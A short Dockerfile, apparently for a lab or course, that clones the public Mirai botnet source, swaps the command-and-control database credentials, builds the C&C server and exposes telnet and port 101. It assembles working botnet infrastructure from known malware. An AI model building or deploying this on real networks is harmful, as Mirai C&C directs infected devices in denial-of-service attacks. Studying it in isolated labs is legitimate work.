FROM golang:latest

RUN apt update && apt install -y mariadb-server mariadb-client telnet git # Adauga alte pachete necesare.

WORKDIR /app

COPY db.sql /app/
COPY start.sh /app/

RUN git clone https://github.com/jgamblin/Mirai-Source-Code.git

WORKDIR /app/Mirai-Source-Code/mirai

RUN go mod init cnc.mirai
RUN go mod tidy

RUN sed -i 's/root/asodb/' cnc/main.go
RUN sed -i 's/password/asodb/' cnc/main.go

RUN go build -o /app/cnc cnc/*.go

RUN mv ./prompt.txt /app/

WORKDIR /app

EXPOSE 23 101

RUN chmod +x /app/start.sh
ENTRYPOINT ["/app/start.sh"]
